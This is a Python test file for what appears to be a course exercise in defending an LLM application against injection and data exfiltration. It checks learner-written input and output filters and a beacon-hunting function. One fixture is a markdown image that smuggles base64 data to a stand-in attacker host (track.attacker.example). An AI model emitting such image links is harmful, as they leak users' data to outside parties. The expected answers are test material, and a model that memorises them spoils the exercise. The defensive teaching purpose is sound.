"""
test_challenge.py: `make challenge`. These FAIL until you write defense.py (Step 3) and the three-part
challenge (Step 5). No solution is included.

  Step 3: the five defence functions in defense.py (replay passes on the recorded trace and the variants).
  Challenge 1 (23.2): find_quiet_beacon() in investigate.py.
  Challenge 2 (23.3): output_check also catches a rendered-image exfiltration (data in the image path, no query).
  Challenge 3 (23.4): input_check stays precise and does NOT flag look-alike normal lines (a negative control).
"""

import unittest

import defense
import investigate
import replay


class TC_Challenge(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.app = investigate.load("app-log.jsonl")
        cls.egress = investigate.load("egress.jsonl")
        cls.variants = investigate.load("variants.jsonl", investigate.HERE / "data")

    def test_07_recorded_defence_holds(self):
        """step 3: your defence catches all 5 malicious findings on the recorded trace with 0 false positives"""
        r = replay.score_recorded(self.app, self.egress)
        self.assertEqual(r["missed"], [], f"missed: {r['missed']}")
        self.assertEqual(r["fp"], [], f"false positives: {r['fp']}")

    def test_08_variant_defence_holds(self):
        """step 3: your defence also catches all 5 on the ADAPTED variants (behaviour, not wording) with 0 FP"""
        r = replay.score_variants(self.variants, self.app, self.egress)
        self.assertEqual(r["missed"], [], f"missed on variants: {r['missed']}")
        self.assertEqual(r["fp"], [], f"false positives: {r['fp']}")

    def test_09_find_quiet_beacon(self):
        """challenge 1: find_quiet_beacon finds svc-backup-02 (a 2-call low-and-slow beacon) and excludes the loud host"""
        rows = investigate.find_quiet_beacon(self.egress)
        self.assertEqual(rows, [{"host": "svc-backup-02", "calls": 2}])

    def test_10_output_check_catches_image_exfil(self):
        """challenge 2: output_check flags a rendered image whose path carries data, to an outside host, with no query"""
        img = {"id": "x-img", "kind": "model_output",
               "text": "All done ![status](https://track.attacker.example/Y3VzdG9tZXJz.png)"}
        self.assertTrue(defense.output_check(img, replay.CONFIG))
        clean = {"id": "x-ok", "kind": "model_output",
                 "text": "All done ![logo](https://kb.tsg.example/logo.png)"}
        self.assertIsNone(defense.output_check(clean, replay.CONFIG))

    def test_11_input_check_is_precise(self):
        """challenge 3: input_check does NOT flag look-alike normal lines (keeps the false-positive rate real)"""
        for text in [
            "Please disregard my earlier message, I already fixed it myself.",
            "Ignore my last email, wrong thread, sorry!",
            "The system says my password is wrong again.",
        ]:
            ev = {"id": "x", "kind": "user_msg", "text": text}
            self.assertIsNone(defense.input_check(ev, replay.CONFIG), text)


if __name__ == "__main__":
    unittest.main()
